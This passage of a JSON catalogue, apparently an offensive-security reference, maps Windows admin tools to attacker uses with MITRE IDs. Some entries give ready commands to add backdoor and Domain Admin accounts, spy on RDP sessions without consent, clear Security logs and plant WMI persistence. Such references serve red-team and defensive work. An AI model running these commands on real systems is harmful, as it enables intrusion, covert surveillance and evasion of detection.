local user accounts", "description": "Add user to local Administrators group", "commandline": "cusrmgr.exe -u TargetUser -alg Administrators -m \\\\W10.ad.bitsadmin.com", "usecases": ["Backdoor account"], "comments": "Part of the Windows 2000 Resource Kit", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 16, "name": "cusrmgr.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Extra"], "synopsis": "Manage local user accounts", "description": "Delete user", "commandline": "cusrmgr.exe -u TargetUser -d -m \\\\W10.ad.bitsadmin.com", "usecases": ["Clear tracks"], "comments": "Part of the Windows 2000 Resource Kit", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 17, "name": "dcdiag.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Directory Server Diagnosis", "description": "TODO", "commandline": "dcdiag.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 18, "name": "devcon.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Extra"], "synopsis": "Displays detailed information about devices", "description": "List drivers", "commandline": "devcon.exe -m:\\\\W10.ad.bitsadmin.com find *", "usecases": ["Identify drivers of security solutions that are installed"], "comments": "Part of Tools component of Windows Driver Kit (WDK)", "resources": ["https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk"], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 19, "name": "dfscmd.exe", "type": "Binaries", "function": "Manage", "toolsets": ["RSAT", "TODO"], "synopsis": "Configures DFS folders and folder targets in a DFS namespace", "description": "TODO", "commandline": "dfscmd.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 20, "name": "dfsdiag.exe", "type": "Binaries", "function": "Manage", "toolsets": ["RSAT", "TODO"], "synopsis": "Provides diagnostic information for DFS Namespaces", "description": "TODO", "commandline": "dfsdiag.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 21, "name": "dfsrdiag.exe", "type": "Binaries", "function": "Manage", "toolsets": ["RSAT", "TODO"], "synopsis": "DFS Replication operational and diagnostics command line utility", "description": "TODO", "commandline": "dfsrdiag.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 22, "name": "dfsutil.exe", "type": "Binaries", "function": "Data", "toolsets": ["RSAT"], "synopsis": "Manage DFS Namespaces, servers, and clients", "description": "List DFS servers of namespace", "commandline": "dfsutil.exe root \\\\ad.bitsadmin.com\\Users", "usecases": [], "comments": "Obtains the information from the DC via port 445/TCP -> DCE/RPC -> Settings for Microsoft Distributed File System\nPerforms (many) resolves via DNS.", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 23, "name": "djoin.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Provision a computer account in the domain", "description": "Provision new computer account", "commandline": "djoin.exe /PROVISION /DOMAIN ad.bitsadmin.com /MACHINE hacker /SAVEFILE hacker.txt /DEFPWD /PRINTBLOB /NETBIOS hacker", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 24, "name": "dnscmd.exe", "type": "Binaries", "function": "Manage", "toolsets": ["RSAT", "TODO"], "synopsis": "Command-line interface for managing DNS servers", "description": "TODO", "commandline": "dnscmd.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 25, "name": "driverquery.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Builtin"], "synopsis": "Display a list of installed device drivers", "description": "List drivers", "commandline": "driverquery.exe /s W10.ad.bitsadmin.com", "usecases": ["Identify drivers of security solutions that are installed"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 26, "name": "dsac.exe", "type": "Binaries", "function": "Domain", "toolsets": ["GUI", "RSAT"], "synopsis": "Active Directory Administrative Center", "description": "Active Directory Administrative Center", "commandline": "dsac.exe", "usecases": ["View user's BitLocker recovery passwords, reset user's passwords and modify security of objects and OUs"], "comments": "Manage -> Add Navigation Nodes -> Connect to other domains -> Connect to: `ad.bitsadmin.com`\nNeeds to be executed from a OffensiveDC with a dummy domain (e.g. a Windows Server machine with a local `hacker.local` domain) in a `runas /netonly` context", "resources": [], "mitre_techniques": [], "detections": "Port: 389/UDP\nPort: 389/TCP\nPort: 9389/TCP\nPort: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 27, "name": "dsacls.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Displays or modifies permissions (ACLS) of an Active Directory Domain Services (AD DS) Object", "description": "TODO", "commandline": "dsacls.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 28, "name": "dsadd.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Add specific types of objects to the directory", "description": "TODO", "commandline": "dsadd.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 29, "name": "dsget.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Display the selected properties of a specific object in the directory", "description": "TODO", "commandline": "dsget.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 30, "name": "dsmgmt.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Facilitates managing AD DS/LDS application partitions, management and control of the Flexible Single Master Operations (FSMO), and cleaning up of metadata left behind by abandoned AD DCs/LDS instances", "description": "TODO", "commandline": "dsmgmt.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 31, "name": "dsmod.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Modifies existing objects in the directory", "description": "TODO", "commandline": "dsmod.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 32, "name": "dsmove.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Moves or renames an object within the directory", "description": "TODO", "commandline": "dsmove.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 33, "name": "dsquery.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "This tool's commands suite allow you to query the directory according to specified criteria. Each of the following dsquery commands finds objects of a specific object type, with the exception of dsquery *, which can query for any type of object", "description": "TODO", "commandline": "dsquery.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 34, "name": "dsrm.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Deletes objects from the directory", "description": "TODO", "commandline": "dsrm.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 35, "name": "eventcreate.exe", "type": "Binaries", "function": "Logs", "toolsets": ["Builtin"], "synopsis": "Create a custom event in a specified event log", "description": "Write error to Application event log", "commandline": "eventcreate.exe /S W10.ad.bitsadmin.com /T Error /ID 100 /L Application /D \"Some description", "usecases": [], "comments": "No events can be written to the Security event log", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 36, "name": "finger.exe", "type": "Binaries", "function": "Network", "toolsets": ["Builtin", "TODO"], "synopsis": "Displays information about a user on a specified system running the Finger service", "description": "TODO", "commandline": "finger.exe", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 37, "name": "getmac.exe", "type": "Binaries", "function": "Network", "toolsets": ["Builtin"], "synopsis": "Returns the media access control (MAC) address and list of network protocols associated with each address for all network cards in each computer", "description": "List network adapters", "commandline": "getmac.exe /V /S W10.ad.bitsadmin.com", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 38, "name": "gpfixup.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Group Policy fix up utility", "description": "TODO", "commandline": "gpfixup.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 39, "name": "gpresult.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Builtin"], "synopsis": "Displays the Resultant Set of Policy (RSoP) information for a remote user and computer", "description": "Save effective policies to XML", "commandline": "gpresult.exe /S W10.ad.bitsadmin.com /SCOPE COMPUTER /X W10.xml", "usecases": ["Understand group policies that are applicable"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 40, "name": "ldifde.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "LDIF Directory Exchange", "description": "TODO", "commandline": "ldifde.exe", "usecases": [], "comments": "Not sure if part of RSAT or not", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 41, "name": "local.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Extra"], "synopsis": "Displays members of local groups on remote servers or domains", "description": "List members of the Administrators group", "commandline": "local.exe Administrators \\\\W10.ad.bitsadmin.com", "usecases": ["Reconnaissance"], "comments": "Part of the Windows 2000 Resource Kit", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 42, "name": "local.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Extra"], "synopsis": "Displays members of local groups on remote servers or domains", "description": "List members of the \"Domain Admins\" group", "commandline": "local.exe \"Domain Admins\" ad.bitsadmin.com", "usecases": ["Reconnaissance"], "comments": "Part of the Windows 2000 Resource Kit", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 43, "name": "logman.exe", "type": "Binaries", "function": "Logs", "toolsets": ["Builtin"], "synopsis": "Creates and manages Event Trace Session and Performance logs and supports many functions of Performance Monitor from the command line", "description": "List ETW providers", "commandline": "logman.exe query providers -s W10.ad.bitsadmin.com", "usecases": ["Identify ETW providers of security solutions that are installed, e.g. Sysinternals Sysmon's `Microsoft-Windows-Sysmon provider`"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 44, "name": "logoff.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Terminates a session", "description": "Logoff user", "commandline": "logoff.exe rdp-tcp#0 /SERVER:W10.ad.bitsadmin.com", "usecases": ["Force logoff of a user"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 45, "name": "manage-bde.exe", "type": "Binaries", "function": "Data", "toolsets": ["Builtin", "TODO"], "synopsis": "BitLocker Drive Encryption Configuration Tool", "description": "TODO", "commandline": "manage-bde.exe -ComputerName W10.ad.bitsadmin.com", "usecases": [], "comments": "", "resources": [], "mitre_techniques": ["T1486"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 46, "name": "mofcomp.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Builtin", "TODO"], "synopsis": "Parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository", "description": "Create persistence", "commandline": "mofcomp.exe -N:\\\\W10.ad.bitsadmin.com\\root\\subscription .\\backdoor.mof", "usecases": [], "comments": "", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 47, "name": "msg.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin", "TODO"], "synopsis": "Send a message to a user", "description": "TODO", "commandline": "msg.exe", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 48, "name": "msinfo32.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Builtin", "GUI"], "synopsis": "Show system information", "description": "System Information", "commandline": "msinfo32.exe", "usecases": ["Show system information"], "comments": "View -> Remote Computer (Ctrl + R)", "resources": [], "mitre_techniques": ["T1082"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 49, "name": "msra.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin", "TODO"], "synopsis": "Windows Remote Assistance", "description": "TODO", "commandline": "msra.exe", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 50, "name": "mstsc.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin", "GUI"], "synopsis": "Connect to the desktop of remote computers", "description": "Control a user's session", "commandline": "mstsc.exe /v:SP2019.ad.bitsadmin.com /shadow:1 /noConsentPrompt /control", "usecases": ["Take over when a user is idle"], "comments": "", "resources": ["https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing"], "mitre_techniques": ["T1021.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 51, "name": "mstsc.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin", "GUI"], "synopsis": "Connect to the desktop of remote computers", "description": "Remote Desktop", "commandline": "mstsc.exe /remoteGuard /v:SP2019.ad.bitsadmin.com", "usecases": ["Connect to a target server", "Exfiltrate data over RDP clipboard or `\\\\tsclient` drives", "If RDP provides access to a different network segment, SocksOverRDP can be used to pivot into that segment"], "comments": "See also [RDCMan.exe](../RDCMan)", "resources": ["https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing"], "mitre_techniques": ["T1021.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 52, "name": "mstsc.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin", "GUI"], "synopsis": "Connect to the desktop of remote computers", "description": "Shadow a user", "commandline": "mstsc.exe /v:SP2019.ad.bitsadmin.com /shadow:1 /noConsentPrompt", "usecases": ["Spy on a user's activity"], "comments": "", "resources": ["https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing"], "mitre_techniques": ["T1021.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 53, "name": "ndkping.exe", "type": "Binaries", "function": "Network", "toolsets": ["Builtin", "TODO"], "synopsis": "RDMA Ping Cmd", "description": "TODO", "commandline": "ndkping.exe", "usecases": [], "comments": "Not sure what this is for", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 54, "name": "net.exe", "type": "Binaries", "function": "Data", "toolsets": ["Builtin"], "synopsis": "Functionalities related to querying and modifying the domain, services, shares and users", "description": "List all shares", "commandline": "net.exe view \\\\W10.ad.bitsadmin.com /all", "usecases": ["Identify all shares, including hidden ones to enumerate for sensitive information"], "comments": "", "resources": ["https://blog.bitsadmin.com/digging-for-secrets"], "mitre_techniques": ["T1135"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 55, "name": "net.exe", "type": "Binaries", "function": "Data", "toolsets": ["Builtin"], "synopsis": "Functionalities related to querying and modifying the domain, services, shares and users", "description": "List shares", "commandline": "net.exe view \\\\W10.ad.bitsadmin.com", "usecases": ["Search for files on shares with credential material", "Identify files that can be backdoored"], "comments": "", "resources": ["https://blog.bitsadmin.com/digging-for-secrets"], "mitre_techniques": ["T1135"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 56, "name": "net.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Builtin"], "synopsis": "Functionalities related to querying and modifying the domain, services, shares and users", "description": "Show time", "commandline": "net.exe time \\\\W10.ad.bitsadmin.com", "usecases": [], "comments": "", "resources": ["https://blog.bitsadmin.com/digging-for-secrets"], "mitre_techniques": ["T1124"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 57, "name": "net.exe", "type": "Binaries", "function": "Domain", "toolsets": ["Builtin"], "synopsis": "Functionalities related to querying and modifying the domain, services, shares and users", "description": "Create new domain account", "commandline": "net.exe user backdoor Password1! /add /domain", "usecases": ["Add backdoor account to the domain"], "comments": "", "resources": ["https://blog.bitsadmin.com/digging-for-secrets"], "mitre_techniques": ["T1136.002", "T1078.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 58, "name": "net.exe", "type": "Binaries", "function": "Domain", "toolsets": ["Builtin"], "synopsis": "Functionalities related to querying and modifying the domain, services, shares and users", "description": "Update password", "commandline": "net.exe user Administrator NewPassword1! /domain", "usecases": ["Overwrite the password of a domain user"], "comments": "", "resources": ["https://blog.bitsadmin.com/digging-for-secrets"], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 59, "name": "net.exe", "type": "Binaries", "function": "Domain", "toolsets": ["Builtin"], "synopsis": "Functionalities related to querying and modifying the domain, services, shares and users", "description": "Add user to domain group", "commandline": "net.exe group \"Domain Admins\" backdoor /add /domain", "usecases": ["Add user to the \"Domain Admins\" group"], "comments": "", "resources": ["https://blog.bitsadmin.com/digging-for-secrets"], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 60, "name": "netdom.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "Server"], "synopsis": "Manage Active Directory domains and trust relationships from the command prompt", "description": "Join machine to domain", "commandline": "netdom.exe join %computername% /domain:ad.bitsadmin.com", "usecases": [], "comments": "Be aware that this will also push group policies and potentially security solutions", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 61, "name": "netdom.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT", "Server"], "synopsis": "Manage Active Directory domains and trust relationships from the command prompt", "description": "Add a trust", "commandline": "netdom.exe trust", "usecases": [], "comments": "TODO: Complete command", "resources": [], "mitre_techniques": ["T1484.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 62, "name": "netsh.exe", "type": "Binaries", "function": "Network", "toolsets": ["Builtin"], "synopsis": "Display or modify the network configuration", "description": "Show firewall rule", "commandline": "netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall show rule name=\"Remote Desktop - Shadow (TCP-In)", "usecases": ["Determine the configuration of a certain firewall rule and whether it is active", "For example usage, see the Spying on users using RDP shadowing blog post (see resources)"], "comments": "", "resources": ["https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing"], "mitre_techniques": ["T1562.004"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 63, "name": "netsh.exe", "type": "Binaries", "function": "Network", "toolsets": ["Builtin"], "synopsis": "Display or modify the network configuration", "description": "Enable firewall rule", "commandline": "netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall set rule name=\"Remote Desktop - Shadow (TCP-In)\" new enable=yes", "usecases": ["Enable firewall rule", "For example usage, see the Spying on users using RDP shadowing blog post (see resources)"], "comments": "", "resources": ["https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing"], "mitre_techniques": ["T1562.004"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 64, "name": "nlb.exe", "type": "Binaries", "function": "Network", "toolsets": ["Server", "TODO"], "synopsis": "Manage Network Load Balancing (NLB)", "description": "TODO", "commandline": "nlb.exe", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 65, "name": "nltest.exe", "type": "Binaries", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Perform network administrative tasks", "description": "List domain trusts", "commandline": "nltest.exe /domain_trusts /all_trusts /v /server:DC1.ad.bitsadmin.com", "usecases": ["Understand the setup of the Active Directory forest"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 66, "name": "nltest.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["RSAT"], "synopsis": "Perform network administrative tasks", "description": "Shutdown machine", "commandline": "nltest.exe /SHUTDOWN:\"\" 0 /SERVER:W10.ad.bitsadmin.com", "usecases": ["Make machine unavailable"], "comments": "", "resources": [], "mitre_techniques": ["T1529"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 67, "name": "nslookup.exe", "type": "Binaries", "function": "Network", "toolsets": ["Builtin"], "synopsis": "Displays information that you can use to diagnose Domain Name System (DNS) infrastructure", "description": "List LDAP servers", "commandline": "nslookup.exe -q=srv _ldap._tcp.ad.bitsadmin.com", "usecases": ["Identify DC IPs"], "comments": "For more DNS domain-related DNS queries, see the link in the resources on DNS-Based Discovery", "resources": ["https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7fcdce70-5205-44d6-9c3a-260e616a2f04"], "mitre_techniques": ["T1590.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 68, "name": "portqry.exe", "type": "Binaries", "function": "Network", "toolsets": ["Extra"], "synopsis": "Displays the state of TCP and UDP ports", "description": "Enumerate RPC endpoints", "commandline": "portqry.exe -n DC1.ad.bitsadmin.com -e 135", "usecases": ["Reconnaissance of available RPC interfaces"], "comments": "Download PortQry from the resource link", "resources": ["https://www.microsoft.com/en-us/download/details.aspx?id=17148"], "mitre_techniques": ["T1046", "T1007"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 69, "name": "printui.exe", "type": "Binaries", "function": "Misc", "toolsets": ["Builtin", "GUI"], "synopsis": "Automates many printer configuration tasks", "description": "Add printer", "commandline": "rundll32.exe printui.dll,PrintUIEntry /im /c\\\\W10.ad.bitsadmin.com", "usecases": [], "comments": "Launches the \"Add Printer\" wizard", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 70, "name": "psexec.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Sysinternals"], "synopsis": "Executes a program on a remote system, where remotely executed console applications execute interactively", "description": "Execute commands", "commandline": "psexec.exe \\\\W10.ad.bitsadmin.com -s cmd.exe /c net user hacker hacker /add ^&^& net localgroup Administrators hacker /add", "usecases": ["In this example adds a backdoor user", "Can also be used to launch an implant"], "comments": "Installs PSEXESVC service on remote system", "resources": [], "mitre_techniques": ["T1569.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 71, "name": "psfile.exe", "type": "Binaries", "function": "Data", "toolsets": ["Sysinternals", "TODO"], "synopsis": "Lists or closes files opened remotely", "description": "List files opened remotely", "commandline": "psfile.exe -nobanner \\\\W10.ad.bitsadmin.com", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 72, "name": "psgetsid.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Sysinternals"], "synopsis": "Translates SIDs to names and vice versa", "description": "Resolve computer SID", "commandline": "psgetsid.exe \\\\W10.ad.bitsadmin.com", "usecases": [], "comments": "Installs service on remote system", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 73, "name": "psgetsid.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Sysinternals"], "synopsis": "Translates SIDs to names and vice versa", "description": "Resolve SID of user", "commandline": "psgetsid.exe \\\\W10.ad.bitsadmin.com Administrator", "usecases": [], "comments": "Installs service on remote system", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 74, "name": "psinfo.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Sysinternals"], "synopsis": "Local and remote system information viewer", "description": "Show basic information", "commandline": "psinfo.exe \\\\W10.ad.bitsadmin.com", "usecases": ["Reconnaissance on system information"], "comments": "Similar to [systeminfo.exe](../systeminfo)", "resources": [], "mitre_techniques": ["T1082"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 75, "name": "pskill.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Sysinternals", "TODO"], "synopsis": "Terminates processes on local or remote systems", "description": "TODO", "commandline": "pskill.exe", "usecases": [], "comments": "", "resources": [], "mitre_techniques": ["T1562.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 76, "name": "pslist.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Sysinternals", "TODO"], "synopsis": "Process information lister", "description": "List all processes", "commandline": "pslist.exe -nobanner \\\\W10.ad.bitsadmin.com", "usecases": ["Reconnaissance on running processes"], "comments": "", "resources": [], "mitre_techniques": ["T1057"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 77, "name": "psloggedon.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Sysinternals"], "synopsis": "See who's logged on", "description": "List both interactive sessions and sessions to shares", "commandline": "psloggedon.exe -nobanner \\\\W10.ad.bitsadmin.com", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 78, "name": "psloggedon.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Sysinternals"], "synopsis": "See who's logged on", "description": "Show sessions", "commandline": "psloggedon.exe \\\\W10.ad.bitsadmin.com", "usecases": ["Reconnaissance on currently active users"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 79, "name": "psloglist.exe", "type": "Binaries", "function": "Logs", "toolsets": ["Sysinternals"], "synopsis": "Dumps event logs on a local or remote system", "description": "Clear Security event log", "commandline": "psloglist.exe -nobanner -i 99999 -c \\\\W10.ad.bitsadmin.com Security", "usecases": ["Cover tracks clearing past logon events"], "comments": "Be aware that this leaves an event stating that the Security event log has been cleared (event id 1102)", "resources": [], "mitre_techniques": ["T1070.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 80, "name": "psloglist.exe", "type": "Binaries", "function": "Logs", "toolsets": ["Sysinternals"], "synopsis": "Dumps event logs on a local or remote system", "description": "List events in the Security event log", "commandline": "psloglist.exe -nobanner -s \\\\W10.ad.bitsadmin.com Security", "usecases": ["Identify which IPs logons of privileged users are originating from"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 81, "name": "pspasswd.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Sysinternals"], "synopsis": "Changes passwords on a local or remote system", "description": "Update password", "commandline": "pspasswd.exe \\\\W10.ad.bitsadmin.com MyUser MyNewPassword", "usecases": ["Update a user's password"], "comments": "", "resources": [], "mitre_techniques": ["T1531"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 82, "name": "psping.exe", "type": "Binaries", "function": "Network", "toolsets": ["Sysinternals", "TODO"], "synopsis": "Implements Ping functionality, TCP ping, UDP/TCP latency, and UDP / TCP bandwidth measurement", "description": "TODO", "commandline": "psping.exe", "usecases": [], "comments": 